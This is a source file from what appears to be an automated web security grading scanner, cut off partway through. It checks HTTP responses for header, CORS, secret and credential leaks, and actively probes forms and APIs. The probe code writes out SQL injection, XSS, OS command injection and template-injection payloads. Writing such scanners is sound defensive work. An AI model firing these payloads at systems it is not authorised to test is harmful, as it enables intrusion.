"""Detection primitives.

- MATCHERS: declarative conditions, (response, arg) -> True when slop is present.
- PREDICATES: oracle conditions for hidden sinks, (ctx) -> True when slop is present.

Slop is always the *presence* of a problem (deduction-only): a matcher/predicate returning True
means the probe fires and adds its penalty.
"""
from __future__ import annotations

import gzip
import json
import re
import secrets
import statistics
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import replace

import httpx

from . import auth, browser, depscan, oob, perf, secretscan
from .net import make_client
from .schema import Endpoint
from .discovery import _CATCHALL_PROBE, _body_sig


# --- innocence check: never fire a phantom finding on a catch-all / soft-404 SHELL ------------------------
# An SPA / soft-404 host serves the SAME 200 shell for EVERY path (client-side routing has no real server
# 404), so a probe hitting a nonexistent endpoint gets a 200 back and mistakes the shell for a real response
# (a submission once scored a phantom SQLi-40 on a literal 404 page). discovery._drop_phantom_surface already
# drops phantom DISCOVERED endpoints; these guards do the same for the probes that hit LITERAL targets. Every
# endpoint is presumed innocent (a phantom that doesn't exist) until PROVEN real: a probe fires only when its
# response DIFFERS from the shell the host serves to a guaranteed-nonexistent path — a real vulnerability makes
# the endpoint behave distinctly, only phantoms match the shell, so this never suppresses a genuine finding.
_UNSET = object()


def _catch_all_sig(ctx):
    """The app SHELL's fingerprint if this host is a catch-all/soft-404 (a guaranteed-nonexistent path answers
    200 HTML), else None. Computed ONCE per grade against the LIVE app (fresh, not the frozen cache -> can't go
    stale on re-grade) and memoized on ctx."""
    cached = getattr(ctx, "_hl_catchall", _UNSET)
    if cached is not _UNSET:
        return cached
    sig = None
    client = getattr(ctx, "client", None)
    if client is not None:
        try:
            r = client.get(_CATCHALL_PROBE)
            if r.status_code == 200 and "html" in r.headers.get("content-type", "").lower():
                sig = _body_sig(r.text)
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
    try:
        ctx._hl_catchall = sig          # memoize (tolerates a stub ctx that rejects attribute writes)
    except Exception:
        pass
    return sig


def _is_phantom_shell(ctx, resp) -> bool:
    """Innocence check: True when the host serves a catch-all shell AND `resp` IS that shell — the probed
    endpoint isn't real, it just echoes the shell, so firing on it would be a phantom finding. False on an
    honest host (real 404s) or a response that DIFFERS from the shell (a real endpoint, where genuine findings
    live)."""
    if resp is None:
        return False
    sig = _catch_all_sig(ctx)
    if not sig:
        return False
    try:
        return resp.status_code == 200 and _body_sig(resp.text) == sig
    except Exception:
        return False

_TRACE = re.compile(
    r"Traceback \(most recent call last\)|File \"[^\"]+\", line \d+, in |"   # Python
    r"\bat [\w.$<>]+ ?\([^\s)]+:\d+:\d+\)|"                                  # JS / Node: at fn (file:line:col)
    r"goroutine \d+ \[[\w ]+\]:|"                                            # Go panic
    r"\.rb:\d+:in [`']|"                                                     # Ruby backtrace
    r"Stack trace:\s*#0 "                                                    # PHP
)

# Fingerprints of a framework's DEBUG UI (the full interactive debugger / DEBUG=True page), not merely a
# leaked stack trace. Each string is distinctive enough to avoid firing on ordinary page content.
_DEBUG_FINGERPRINT = re.compile(
    r"Werkzeug Debugger|"                        # Flask / Werkzeug interactive debugger (leaks src + RCE console)
    r"seeing this error because you have|"       # Django DEBUG = True technical-500 page
    r"Better Errors|Rails\.root:|"               # Rails debug (better_errors / web-console)
    r"Whoops, looks like something went wrong",  # Laravel / Symfony (Whoops) debug page
    re.IGNORECASE)


# ---- declarative matchers -------------------------------------------------------------------

def ttfb_at_least(resp, arg) -> bool:
    # Slice uses one sample; production samples N and takes the median (see FUZZ_RUNNER_SPEC).
    return resp.elapsed.total_seconds() >= float(arg)


def response_contains(resp, arg) -> bool:
    # Reflection check (e.g. an injected XSS marker echoed back unescaped).
    return str(arg) in resp.text


# A config-POLICY check (headers/CORS/compression) is meaningless on a server error: an env-var-dead
# endpoint's 500 error page isn't the app's header policy, and counting it manufactures findings from a
# broken endpoint. The probe fans over many routes, so a HEALTHY page still catches a real omission.
def _policy_applies(resp) -> bool:
    return resp.status_code < 500


def response_missing_header(resp, arg) -> bool:
    return _policy_applies(resp) and str(arg) not in resp.headers  # httpx headers are case-insensitive


def response_missing_clickjacking_defense(resp, arg=None) -> bool:
    # Clickjacking is defended by EITHER X-Frame-Options OR a CSP frame-ancestors directive;
    # checking only one header would false-positive on an app that uses the other.
    if not _policy_applies(resp) or "x-frame-options" in resp.headers:
        return False
    return "frame-ancestors" not in resp.headers.get("content-security-policy", "").lower()


_CSP_NEUTRALIZED = re.compile(r"'nonce-|'sha(?:256|384|512)-|'strict-dynamic'")


def response_csp_weak(resp, arg=None) -> bool:
    """A CSP that's PRESENT but toothless against XSS — script execution allowed via 'unsafe-inline' or a
    scheme/wildcard host source (`*`/`https:`/`http:`), with NO nonce/hash/strict-dynamic to neutralize it, or
    no script restriction at all. Only fires when a CSP exists (absence is response_missing_header's job); a
    modern nonce/hash CSP reads clean. A present-but-weak CSP is a false sense of XSS safety -> graded."""
    if not _policy_applies(resp):
        return False
    csp = resp.headers.get("content-security-policy", "").lower()
    if not csp:
        return False   # absent -> the missing-header probe owns it; don't double-count
    directives = {}
    for part in csp.split(";"):
        toks = part.split()
        if toks:
            directives[toks[0]] = toks[1:]
    script = directives.get("script-src", directives.get("default-src"))
    if script is None:
        return True                                  # no script-src/default-src -> scripts unrestricted
    if _CSP_NEUTRALIZED.search(" ".join(script)):
        return False                                 # nonce/hash/strict-dynamic -> 'unsafe-inline' ignored -> strong
    return any(s in script for s in ("'unsafe-inline'", "*", "https:", "http:"))  # scripts from anywhere


def response_cors_misconfigured(resp, arg=None) -> bool:
    # Slop when the app reflects the request Origin into Access-Control-Allow-Origin AND allows
    # credentials: any site can then make credentialed cross-origin reads. Bare ACAO:* is excluded
    # (browsers refuse credentials with *), so this flags only the genuinely exploitable case.
    if not _policy_applies(resp):
        return False
    sent_origin = resp.request.headers.get("origin", "")
    acao = resp.headers.get("access-control-allow-origin", "")
    creds = resp.headers.get("access-control-allow-credentials", "").lower() == "true"
    return bool(sent_origin) and acao == sent_origin and creds


def response_server_error(resp, arg=None) -> bool:
    # A crash is a 5xx the app caused, not 501 (method not implemented) or 405.
    return resp.status_code in (500, 502, 503, 504)


def response_uncompressed(resp, arg=1024) -> bool:
    # Slop: a sizeable TEXT response served with no Content-Encoding (gzip/br/deflate) -> wasted
    # bandwidth and slower loads. Gate on size — small bodies don't benefit from compression, so a
    # server that skips them is correct, not slop. httpx always sends Accept-Encoding and keeps the
    # Content-Encoding header, so its presence means the server compressed.
    if not _policy_applies(resp):
        return False
    ctype = resp.headers.get("content-type", "").lower()
    if not any(t in ctype for t in ("text/", "javascript", "json", "xml", "svg")):
        return False
    if "content-encoding" in resp.headers:
        return False
    return len(resp.content) > int(arg)


def response_has_header(resp, arg) -> bool:
    return _policy_applies(resp) and str(arg) in resp.headers  # presence is slop (X-Powered-By leaks stack)


def response_is_aws_credentials(resp, arg=None) -> bool:
    # an AWS credentials file served at the webroot — content-signatured so an SPA catch-all 200 (the
    # index shell) doesn't false-positive the way a bare 200 check would.
    t = resp.text.lower()
    return "aws_access_key_id" in t or "aws_secret_access_key" in t


# High-confidence server secrets that must never reach a client. Precision over recall: we skip
# public-by-design values (Firebase apiKey AIza..., Stripe publishable pk_..., generic JWT session
# tokens), because a false positive wrongly penalizes a non-flaw.
def response_leaks_secret(resp, arg=None) -> bool:
    # one comprehensive, public-key-guarded provider set, shared with the source scan (secretscan._PROVIDER)
    return bool(secretscan.scan_blob(resp.text))


# Credential material an API response must never contain: a populated password-family field, or a
# password-hash signature. High precision by design — password fields are NEVER a legitimate part of
# a response (unlike access/refresh tokens, which ARE the auth flow and are excluded). Masked values
# (***, xxxx, [REDACTED]) and the OpenAPI spec's own schema examples are excluded.
_CRED_FIELD = re.compile(
    r'"(?:password|passwd|pwd|hashed_password|password_hash|pwd_hash|user_password|'
    r'plaintext_password)"\s*:\s*"(?!\s*(?:\*{2,}|x{4,}|redacted|hidden|\.{3})\s*")[^"]{2,}"',
    re.IGNORECASE,
)
_CRED_HASH = re.compile(
    r"\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}"   # bcrypt
    r"|\$argon2(?:id|i|d)\$"                # argon2
    r"|\$6\$[./A-Za-z0-9]{8,}"             # sha512crypt
    r"|\$1\$[./A-Za-z0-9]{6,}"             # md5crypt
    r"|\bpbkdf2_sha256\$\d+\$"             # Django PBKDF2
)
_OPENAPI_DOC = re.compile(r'"(?:openapi|swagger)"\s*:\s*"')


def response_leaks_credentials(resp, arg=None) -> bool:
    if resp.status_code != 200:
        return False
    body = resp.text
    # Excessive data exposure = credentials in a DATA (JSON) response, not in code/markup. A JS bundle
    # with hide?"password":"text" (the Angular/Material password-toggle) is not a leak; genuine secrets
    # hardcoded in JS are caught by response_leaks_secret (key patterns). So require a JSON body.
    ctype = resp.headers.get("content-type", "").lower()
    if "json" not in ctype and body.lstrip()[:1] not in ("{", "["):
        return False
    if _OPENAPI_DOC.search(body[:4000]):
        return False  # a served spec naming a "password" field in its schema isn't a data leak
    return bool(_CRED_FIELD.search(body) or _CRED_HASH.search(body))


# Files that must never be served at the webroot (deploying with .env / .git present is classic
# slop). Each requires status 200 AND a content signature, so a 404 / redirect reads clean.
_DOTENV = re.compile(r"(?im)^[ \t]*(?:export[ \t]+)?[A-Z0-9_]*(?:SECRET|PASSWORD|TOKEN|KEY|CREDENTIAL|DATABASE_URL)[A-Z0-9_]*[ \t]*=")


def response_is_dotenv(resp, arg=None) -> bool:
    return resp.status_code == 200 and bool(_DOTENV.search(resp.text))


def response_is_git_config(resp, arg=None) -> bool:
    return resp.status_code == 200 and "[core]" in resp.text and "repositoryformatversion" in resp.text


def response_is_git_head(resp, arg=None) -> bool:
    # symbolic ref (ref: refs/...) OR a detached-HEAD raw commit SHA
    return resp.status_code == 200 and bool(re.fullmatch(r"ref: refs/\S+|[0-9a-f]{40}", resp.text.strip()))


MATCHERS = {
    "ttfb_at_least": ttfb_at_least,
    "response_contains": response_contains,
    "response_missing_header": response_missing_header,
    "response_missing_clickjacking_defense": response_missing_clickjacking_defense,
    "response_csp_weak": response_csp_weak,
    "response_cors_misconfigured": response_cors_misconfigured,
    "response_server_error": response_server_error,
    "response_uncompressed": response_uncompressed,
    "response_has_header": response_has_header,
    "response_is_aws_credentials": response_is_aws_credentials,
    "response_leaks_secret": response_leaks_secret,
    "response_leaks_credentials": response_leaks_credentials,
    "response_is_dotenv": response_is_dotenv,
    "response_is_git_config": response_is_git_config,
    "response_is_git_head": response_is_git_head,
}


# ---- oracle predicates ----------------------------------------------------------------------

def _authed(resp) -> bool:
    return resp.status_code == 200 and "welcome" in resp.text.lower()


def sqli_auth_bypass(ctx, probe) -> bool:
    """Boolean/auth-bypass oracle: a benign login fails, an injection payload succeeds. The
    divergence (only possible if the input reaches a live, unparameterized query) is the slop.
    The payload comes from the probe, so variant-group members reuse one oracle with different
    syntaxes."""
    payload = probe.probe.get("payload", "' OR '1'='1' -- ")
    endpoints = ctx.profile.form_endpoints or ["/login"]
    for endpoint in endpoints:
        baseline = ctx.client.post(
            endpoint, data={"username": "zzz_no_such_user", "password": "x"}
        )
        attack = ctx.client.post(endpoint, data={"username": payload, "password": "x"})
        if _authed(attack) and not _authed(baseline):
            ctx.evidence.update(bypassed=True, endpoint=endpoint, payload=payload)
            return True
    ctx.evidence.update(bypassed=False, endpoints_tried=len(endpoints), payload=payload)
    return False


# Error-based SQL injection over the API surface discovered from the OpenAPI spec (path params, query
# params, JSON body fields) — the injection points a form-crawler never sees on a JSON API. Precision
# comes from a differential + a DB-error signature: an unbalanced quote must induce a database error
# string the benign baseline never shows. Only GET/POST are probed (never PUT/PATCH/DELETE), so
# grading can't destroy the target's state.
_SQL_ERROR = re.compile(
    r"SQL syntax|SQLITE_ERROR|sqlite3\.(?:Operational|Integrity|Programming|Interface)Error|"
    r"sqlalchemy\.exc|unrecognized token|unterminated quoted string|"
    r"quoted string not properly terminated|you have an error in your sql syntax|mysqlsyntaxerror|"
    r"com\.mysql|psycopg2|PG::\w*Error|PostgreSQL query failed|ORA-\d{5}|Microsoft OLE DB|"
    r"ODBC SQL Server|SQLSTATE\[|Npgsql\.|unclosed quotation mark|incorrect syntax near|\[SQL:\s",
    re.IGNORECASE,
)
_SQLI_BENIGN = "1"
_SQLI_PAYLOAD = "1'"  # a lone quote breaks unparameterized string SQL -> a detectable DB error


def _sqli_slots(ep) -> list[tuple[str, str]]:
    """Injectable positions on an endpoint as (kind, name): path params, query params, body fields."""
    return ([("path", n) for n in ep.path_params]
            + [("query", n) for n in ep.query_params]
            + [("body", n) for n in ep.body_fields])


def _sqli_request(ep, poison, value: str):
    """(path, query_dict, json_body) for ep with the single `poison` slot set to `value` and every
    other slot benign; poison=None yields the all-benign baseline."""
    def sv(kind, name):
        return value if poison == (kind, name) else _SQLI_BENIGN
    path = ep.raw_path
    for n in ep.path_params:
        path = path.replace("{" + n + "}", urllib.parse.quote(sv("path", n), safe=""))
    query = {n: sv("query", n) for n in ep.query_params}
    body = {n: sv("body", n) for n in ep.body_fields} or None
    return path, query, body


# Common query-parameter names to try on a GET endpoint that declares none — a mined SPA path
# (/rest/products/search) or an HTML search form exposes no param schema, so we probe likely names.
_COMMON_PARAMS = ("q", "query", "search", "id", "name", "term", "keyword", "filter")
# Only guess params on GET paths that plausibly take input — keeps the extra requests bounded/precise.
_SEARCHABLE = re.compile(r"search|find|query|filter|lookup|list|products?|items?|users?|orders?", re.I)


def _sqli_targets(profile):
    """Injection targets: OpenAPI/mined endpoints as-is, plus GET HTML forms (fields -> query params)
    and param-less searchable GET endpoints probed with common param names — so a mined
    /rest/products/search and a DVWA-style `?id=` GET form both get exercised, not just declared params."""
    targets = []
    for e in profile.endpoints:
        if (e.method.lower() == "get" and not e.query_params and not e.path_params
                and _SEARCHABLE.search(e.raw_path)):
            targets.append(replace(e, query_params=list(_COMMON_PARAMS)))
        else:
            targets.append(e)
    for f in profile.forms:
        if f.fields and (f.method or "get").lower() == "get":
            targets.append(Endpoint(path=f.action, method="get",
                                    query_params=list(f.fields), raw_path=f.action))
    return targets


# SQLi detection techniques — comprehensive coverage of how ONE flaw ("this parameter reaches an
# unparameterized query") manifests. All share a single finding (the predicate returns once): technique
# breadth is RECALL, not extra penalty. Ordered cheap->expensive; time-based is a bounded last resort.
def _do(c, method, req):
    path, query, body = req
    return c.request(method, path, params=query or None, json=body)


_PREFIX_SENTINEL = "__hl_nx_9z1x__"   # a guaranteed-nonexistent path segment (fixed -> deterministic)


def _endpoint_is_live(ctx, client, path: str, method: str, base_resp) -> bool:
    """Liveness gate for PHANTOM-SENSITIVE probes — the ones that need a REAL server handler to mean
    anything (SQLi, CSRF, rate-limit, crash-resistance). True when `path` has a real handler: its benign
    baseline differs from BOTH the ROOT catch-all shell AND a guaranteed-nonexistent sibling under its OWN
    prefix. A catch-all / soft-404 host serves the same shell for every path (at the root AND per-prefix),
    so firing a server-side probe there invents a finding on an endpoint that does not exist server-side
    (the sec-sqli-40 / rate-limit / crash false positives). An HONEST host (real 404s for nonexistent
    paths) always passes, so genuine findings still fire — this only suppresses phantoms. It is the single
    gate that generalizes the root innocence check (_is_phantom_shell) and the per-prefix catch-all check.
    Universal probes (headers/a11y/perf) never call it: a missing header is missing on a catch-all shell too."""
    if base_resp is None:
        return True                        # no baseline to judge -> don't suppress; the probe's oracle decides
    if _is_phantom_shell(ctx, base_resp):
        return False                       # baseline IS the root catch-all shell -> phantom endpoint
    prefix = path.rsplit("/", 1)[0]
    fake = f"{prefix}/{_PREFIX_SENTINEL}" if prefix else "/" + _PREFIX_SENTINEL
    try:
        r = client.request((method or "get").upper(), fake)
        if r.status_code == base_resp.status_code and _body_sig(r.text) == _body_sig(base_resp.text):
            return False                   # a nonexistent sibling answers identically -> per-prefix catch-all
    except (httpx.HTTPError, httpx.InvalidURL):
        pass
    except Exception:
        pass
    return True


def _tech_error(c, method, reqfn) -> bool:
    """A lone quote induces a DB-error signature (the app leaks SQL errors)."""
    return bool(_SQL_ERROR.search(_do(c, method, reqfn(_SQLI_PAYLOAD)).text))


_SQLI_TRUE = "1' OR '1'='1' -- "
_SQLI_FALSE = "1' OR '1'='2' -- "   # SAME length as TRUE; differs only in the boolean's truth value


def _diverges(a, b) -> bool:
    """Two responses differ materially: status, or a body-size gap too large for equal-length reflected
    payloads to explain."""
    if a.status_code != b.status_code:
        return True
    hi, lo = max(len(a.text), len(b.text)), min(len(a.text), len(b.text))
    return hi - lo > max(64, hi * 0.15)


def _tech_boolean(c, method, reqfn) -> bool:
    """An always-true vs always-false condition (same-length payloads) changes the result set on an
    otherwise-stable endpoint — visible or blind boolean injection."""
    f1 = _do(c, method, reqfn(_SQLI_FALSE))
    f2 = _do(c, method, reqfn(_SQLI_FALSE))
    if _diverges(f1, f2):
        return False  # output not stable across identical calls -> a true/false diff isn't attributable
    return _diverges(_do(c, method, reqfn(_SQLI_TRUE)), f1)


_UNION_MARK = "HLuok42"                                          # the CONCATENATION result; a literal
_UNION_COLS = ("'HLu'||'ok'||'42'", "CONCAT('HLu','ok','42')")  # echo of the payload can't produce it


def _tech_union(c, method, reqfn) -> bool:
    """A UNION SELECT of a concatenated marker executes — the marker appears only if the SQL ran, not
    from reflecting the payload literal. Tries ANSI `||` and MySQL CONCAT across column counts."""
    for expr in _UNION_COLS:
        for n in range(1, 7):
            cols = ",".join([expr] + ["NULL"] * (n - 1))
            if _UNION_MARK in _do(c, method, reqfn("1' UNION SELECT %s -- " % cols)).text:
                return True
    return False


_TIME_PAYLOADS = ("1' OR SLEEP({d}) -- ", "1'||pg_sleep({d})-- ",
                  "1'); SELECT pg_sleep({d})-- ", "1' AND SLEEP({d})=0 -- ")


def _tech_time(c, method, reqfn, delay) -> bool:
    """A time-delay payload measurably slows the response (confirmed twice, to reject jitter) — fully
    blind injection where nothing observable changes but attacker SQL still executes."""
    def elapsed(p):
        t0 = time.perf_counter()
        _do(c, method, reqfn(p))
        return time.perf_counter() - t0
    for tmpl in _TIME_PAYLOADS:
        p = tmpl.format(d=delay)
        if elapsed(p) >= delay * 0.8 and elapsed(p) >= delay * 0.8:
            return True
    return False


_DEEP_SLOTS = 6  # UNION + time are expensive/blind -> run them on at most this many slots


def api_sqli(ctx, probe) -> bool | None:
    """SQL injection across the discovered surface (OpenAPI + mined API paths + HTML GET forms, with
    common-param guessing on param-less searchable GETs). Per injectable slot, tries error-, boolean-,
    UNION-, and time-based detection — one flaw, one finding. N/A when no injectable GET/POST target
    exists; the SQL-error / stability / double-timing guards keep a parameterized app clean."""
    targets = [e for e in _sqli_targets(ctx.profile)
               if e.method.lower() in ("get", "post") and _sqli_slots(e)]
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 120)
    delay = probe.probe.get("time_delay", 3)
    tested = False
    slots_tested = 0
    eps_tested: list = []
    deep: list = []  # slots deferred to the UNION/time (blind, last-resort) pass
    techs = ["error", "boolean", "union", "time"]
    with make_client(ctx.base_url, ctx.headers, timeout=max(15.0, delay + 8),
                     follow_redirects=False) as c:
        for ep in targets:
            method = ep.method.upper()
            try:
                base = _do(c, method, _sqli_request(ep, None, _SQLI_BENIGN))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if _SQL_ERROR.search(base.text):
                continue  # baseline already errors for unrelated reasons -> can't attribute injection
            if not _endpoint_is_live(ctx, c, ep.raw_path, method, base):
                continue  # phantom endpoint (root or per-prefix catch-all shell) -> not a real SQL sink
            eps_tested.append(ep.raw_path)
            for slot in _sqli_slots(ep):
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                slots_tested += 1
                reqfn = (lambda ep=ep, slot=slot: lambda v: _sqli_request(ep, slot, v))()
                try:
                    if _tech_error(c, method, reqfn) or _tech_boolean(c, method, reqfn):
                        ctx.evidence.update(injectable=True, via="error/boolean", param=slot,
                                            endpoint=ep.raw_path, techniques_tried=techs)
                        return True
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if len(deep) < _DEEP_SLOTS:
                    deep.append((method, reqfn, ep.raw_path, slot))
            if budget <= 0:
                break
        for method, reqfn, path, slot in deep:
            try:
                if _tech_union(c, method, reqfn) or _tech_time(c, method, reqfn, delay):
                    ctx.evidence.update(injectable=True, via="union/time", param=slot,
                                        endpoint=path, techniques_tried=techs)
                    return True
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    ctx.evidence.update(injectable=False, endpoints_tested=len(eps_tested),
                        params_tested=slots_tested, techniques_tried=techs)
    return False if tested else None


def _injectable_targets(profile):
    """(action, method, field_names) over the injectable input surface — HTML forms (GET + POST) and
    reflecting/searchable query GETs — shared by the reflection/injection probes (XSS, command
    injection, path traversal)."""
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in profile.forms if f.fields]
    q_eps = [(e.raw_path, "get", list(e.query_params)) for e in profile.endpoints
             if e.method.lower() == "get" and e.query_params]
    s_eps = [(e.raw_path, "get", list(_COMMON_PARAMS)) for e in profile.endpoints
             if e.method.lower() == "get" and not e.query_params and not e.path_params
             and _SEARCHABLE.search(e.raw_path)]
    return forms + q_eps + s_eps


# Reflected + stored XSS — comprehensive technique coverage of one flaw ("this input is echoed into
# HTML unescaped"), collapsing to a single finding. Each payload targets a different reflection context;
# detection is verbatim, unescaped reflection of a UNIQUE per-run marker (an escaping app encodes the
# `<`/`"` -> the detect string never appears -> clean). The browser dom_xss probe covers execution.
def _xss_payloads(m: str):
    """(inject, detect) per technique — `detect` appears only if `inject` reflects unescaped."""
    return [
        ("<script>%s</script>" % m, "<script>%s</script>" % m),            # script tag in HTML body
        ("<img src=x onerror=%s>" % m, "<img src=x onerror=%s>" % m),      # <img> event handler
        ("<svg onload=%s>" % m, "<svg onload=%s>" % m),                    # <svg> event handler
        ('<a href="javascript:%s">x</a>' % m, 'href="javascript:%s"' % m), # javascript: URI
        ('"><svg onload=%s>' % m, "<svg onload=%s>" % m),                  # break out of an attribute value
        ('" onmouseover=%s x="' % m, '" onmouseover=%s' % m),              # attribute event injection (no <)
        ("</script><svg onload=%s>" % m, "<svg onload=%s>" % m),           # break out of a <script> block
        ("<ScRiPt>%s</ScRiPt>" % m, "<ScRiPt>%s</ScRiPt>" % m),            # case-varied tag (filter bypass)
    ]


_XSS_FILLER = "hlxfill"  # benign value for the fields we're not currently injecting


def _xss_send(c, method, action, data):
    if (method or "get").lower() == "get":
        return c.request("GET", action, params=data)
    return c.request("POST", action, data=data)  # HTML form -> form-encoded body


def _reflects(resp, detect: str) -> bool:
    """The payload reflects unescaped AND in an HTML response — a payload echoed into a JSON API body
    is not XSS (JSON isn't rendered as HTML), so gate on the content type to avoid that false positive."""
    return "html" in resp.headers.get("content-type", "").lower() and detect in resp.text


def xss_injectable(ctx, probe) -> bool | None:
    """Reflected + stored XSS across discovered forms and reflecting query params. Per field, injects
    each payload shape (script / img / svg / javascript-URI / attribute-breakout / script-breakout /
    case-varied) and fires on verbatim unescaped reflection of a unique marker; for POST forms, also
    submits then re-fetches the page to catch STORED XSS. N/A when there's no HTML input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    m = "hlx" + secrets.token_hex(4)
    payloads = _xss_payloads(m)
    budget = probe.probe.get("max_attempts", 150)
    tested = False
    checked = 0
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                checked += 1
                # Cheap gate: does this field echo the marker into an HTML response at all? If not, no
                # reflected XSS is possible here -> skip the 8 payload shapes. Keeps breadth across every
                # form affordable (a non-reflecting form costs 1 request/field, not 8).
                try:
                    probe_resp = _xss_send(c, method, action, {fn: (m if fn == field else _XSS_FILLER) for fn in fields})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if not _reflects(probe_resp, m):
                    continue
                for inject, detect in payloads:
                    if budget <= 0:
                        break
                    budget -= 1
                    data = {fn: (inject if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        if _reflects(_xss_send(c, method, action, data), detect):
                            ctx.evidence.update(injectable=True, kind="reflected", target=action, field=field)
                            return True  # reflected unescaped in an HTML (executable) context -> XSS
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
            if budget <= 0:
                break
            # STORED: submit a script payload, then re-fetch the page — persisted reflection = stored XSS
            if method == "post" and budget > 0:
                budget -= 1
                inject, detect = payloads[0]
                try:
                    _xss_send(c, "post", action, {fn: inject for fn in fields})
                    if _reflects(c.get(action), detect):
                        ctx.evidence.update(injectable=True, kind="stored", target=action)
                        return True  # persisted across a fresh request -> stored XSS
                except (httpx.HTTPError, httpx.InvalidURL):
                    pass
    ctx.evidence.update(injectable=False, fields_tested=checked, payload_shapes=len(payloads))
    return False if tested else None


# OS command injection — comprehensive coverage: shell separators (; | || && newline), command
# substitution ($(...) and backticks), and a blind time-based fallback; one finding. Precision: the
# marker is the RESULT of a shell-evaluated arithmetic expr (13*13 -> 169) — it appears ONLY if a shell
# ran the payload, never from reflecting the literal (which shows the "$((13*13))" text). Execution, not echo.
_CMD_OUT = "hlci169"
_CMD_TAIL = "echo hlci$((13*13))"          # -> hlci169 when a POSIX shell evaluates it
# empty base so the host command fails FAST (`ping ;echo ...`), never hanging on a bogus host arg
_CMD_SEPS = (";%s", "|%s", "||%s", "&&%s", "\n%s", "$(%s)", "`%s`")
_CMD_TIME = (";sleep {d}", "$(sleep {d})", "`sleep {d}`", "&&sleep {d}", "|sleep {d}")


def _elapsed(c, method, action, data) -> float:
    """Seconds for one request; a large sentinel on error so it can't look like a fast baseline."""
    t0 = time.perf_counter()
    try:
        _xss_send(c, method, action, data)
    except (httpx.HTTPError, httpx.InvalidURL):
        return 0.0
    return time.perf_counter() - t0


def command_injection(ctx, probe) -> bool | None:
    """OS command injection across forms + query params. Injects `<sep> echo <arith>` across shell
    separators and command-substitution; fires when the arithmetic RESULT (not the literal) reflects —
    proving a shell executed it. Falls back to blind time-based sleep. N/A when no input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 120)
    delay = probe.probe.get("time_delay", 3)
    tested = False
    checked = 0
    deep: list = []
    with make_client(ctx.base_url, ctx.headers, timeout=max(15.0, delay + 8), follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                try:
                    baseline = _xss_send(c, method, action, {fn: (_XSS_FILLER if fn != field else "1") for fn in fields})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if _CMD_OUT in baseline.text:
                    continue  # already present -> can't attribute to the injection
                checked += 1
                for sep in _CMD_SEPS:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    inject = sep % _CMD_TAIL
                    data = {fn: (inject if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        if _CMD_OUT in _xss_send(c, method, action, data).text:
                            ctx.evidence.update(injectable=True, via="separator/substitution",
                                                target=action, field=field)
                            return True  # a shell evaluated echo hlci$((13*13)) -> hlci169 -> injectable
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                if len(deep) < _DEEP_SLOTS:
                    deep.append((action, method, fields, field))
            if budget <= 0:
                break
        for action, method, fields, field in deep:  # blind time-based (no observable output)
            base_time = _elapsed(c, method, action, {fn: (_XSS_FILLER if fn != field else "x") for fn in fields})
            for tmpl in _CMD_TIME:
                data = {fn: (tmpl.format(d=delay) if fn == field else _XSS_FILLER) for fn in fields}
                # delta vs THIS slot's baseline (the host command itself may be slow, e.g. ping) so a
                # naturally-slow endpoint can't false-positive; confirm twice to reject jitter
                if all(_elapsed(c, method, action, data) - base_time >= delay * 0.7 for _ in range(2)):
                    ctx.evidence.update(injectable=True, via="time-based", target=action, field=field)
                    return True
    ctx.evidence.update(injectable=False, fields_tested=checked,
                        techniques=["separator", "substitution", "time-based"])
    return False if tested else None


# Server-Side Template Injection + eval-based code injection — user input evaluated as CODE (a template
# expression or an eval'd statement) instead of treated as data -> RCE. Comprehensive across template
# engines AND eval sinks; one finding. Precision by the arithmetic-marker trick (as in command
# injection): the RESULT "<marker>49" appears only if the input was EVALUATED; reflecting the literal
# shows "<marker>{{7*7}}". The unique random marker makes a coincidental "...49" impossible.
_SSTI_EXPRS = (
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}", "@(7*7)", "*{7*7}", "${{7*7}}",  # template engines
    ";echo 7*7;", "';echo 7*7;//", '";echo 7*7;//', ";print(7*7)#", "<?php echo 7*7;?>",   # eval code sinks
)


def ssti_injectable(ctx, probe) -> bool | None:
    """Template / eval code injection across query params and forms. Injects <marker> + 7*7 in each
    template syntax (Jinja/Twig/Freemarker/ERB/Smarty/Razor/...) and each eval shape (PHP/Python);
    fires when "<marker>49" reflects — the value was computed server-side. N/A when no input surface.
    Query params are tested before forms (template/render sinks are usually GET params)."""
    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and e.query_params]
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
    s = [(e.raw_path, "get", list(_COMMON_PARAMS)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and not e.query_params and not e.path_params
         and _SEARCHABLE.search(e.raw_path)]
    targets = q + forms + s
    if not targets:
        return None
    m = "hlssti" + secrets.token_hex(3)
    detect = m + "49"
    payloads = [m + e for e in _SSTI_EXPRS]
    budget = probe.probe.get("max_attempts", 160)
    tested = False
    fields_seen = set()
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                for p in payloads:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    fields_seen.add((action, field))
                    data = {fn: (p if fn == field else _XSS_FILLER) for fn in fields}
                    try:
